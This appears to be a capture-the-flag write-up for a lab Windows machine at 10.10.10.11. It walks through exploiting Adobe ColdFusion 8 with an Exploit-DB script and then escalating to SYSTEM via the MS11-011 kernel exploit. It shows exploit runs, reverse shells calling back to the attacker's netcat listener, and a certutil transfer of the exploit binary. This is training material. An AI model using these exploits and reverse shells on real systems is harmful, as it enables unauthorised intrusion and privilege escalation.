# IP Address: 10.10.10.11

# Enumeration
```
┌──(code㉿kali)-[~]
└─$ nmapAutomator.sh -H 10.10.10.11 -t all

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### 8500/tcp
We find a directory listing at http://10.10.10.11:8500/. At /administrator, we see an Adobe ColdFusion 8 login form. Searching for exploits, we find https://www.exploit-db.com/exploits/50057

This exploit generates and sends a payload with a pause timer, sets up a netcat listener and catches a reverse shell. We only need to change the local host bits. It must have been created for this particular CTF since the target IP address and port match up perfectly!

Original:
```
┌──(code㉿kali)-[~]
└─$ grep "Define some" 50057.py -A 5
    # Define some information
    lhost = '10.10.16.4'
    lport = 4444
    rhost = "10.10.10.11"
    rport = 8500

```

Edited:
```
┌──(code㉿kali)-[~]
└─$ grep "Define some" 50057.py -A 5
    # Define some information
    lhost = '10.10.14.17'		# EDIT
    lport = 4444
    rhost = "10.10.10.11"
    rport = 8500
```

# Exploitation

Result:
```
└─$ python3 50057.py                                                                                

Generating a payload...
Payload size: 1497 bytes
Saved as: 7312ae0e03bd4ca3aaeb2547d08c3233.jsp

Priting request...
Content-type: multipart/form-data; boundary=583d326497004a288f345c597fe27c71
Content-length: 1698

...

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.11] 49803

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>

```

user.txt

![[Pasted image 20211122202119.png]]


# Privilege Escalation
Copy the output of `systeminfo` to local file and run against it windows-exploit-suggester.
Find pre-compiled exploit MS11-011.exe from https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-011

Copy the exploit to target using certutil and run, specifying the local netcat listener:
```
C:\ColdFusion8\runtime\bin>exploit2.exe 10.10.14.17 4499
exploit2.exe 10.10.14.17 4499
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
C:\ColdFusion8\runtime\bin>

```


Listener:
```
┌──(code㉿kali)-[~/tools/windows-kernel-exploits]
└─$ nc -nlvp 4499                                                                                   
listening on [any] 4499 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.11] 50044
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
nt authority\system
```

# Proof
root.txt

![[Pasted image 20211122211625.png]]